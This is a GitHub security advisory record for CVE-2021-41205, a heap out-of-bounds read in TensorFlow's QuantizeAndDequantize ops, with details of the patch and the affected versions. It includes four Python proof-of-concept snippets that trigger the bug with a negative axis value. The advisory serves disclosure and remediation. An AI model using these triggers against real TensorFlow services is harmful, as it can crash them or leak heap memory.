{
    "ghsaId": "GHSA-49rx-x2rw-pc6f",
    "severity": "MODERATE",
    "summary": "Heap OOB read in all `tf.raw_ops.QuantizeAndDequantizeV*` ops",
    "description": "### Impact\nThe [shape inference functions for the `QuantizeAndDequantizeV*` operations](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc) can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients=[1.0,1.0],\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV3(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV2(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\nIn all of these cases, `axis` is a negative value different than the special value used for optional/unknown dimensions (i.e., -1). However, the code ignores the occurences of these values:\n\n```cc\n...\nif (axis != -1) {\n  ...\n  c->Dim(input, axis);\n  ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d](https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.\n",
    "permalink": "https://github.com/advisories/GHSA-49rx-x2rw-pc6f",
    "publishedAt": "2021-11-10T19:04:25Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-49rx-x2rw-pc6f"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-41205"
        }
    ]
}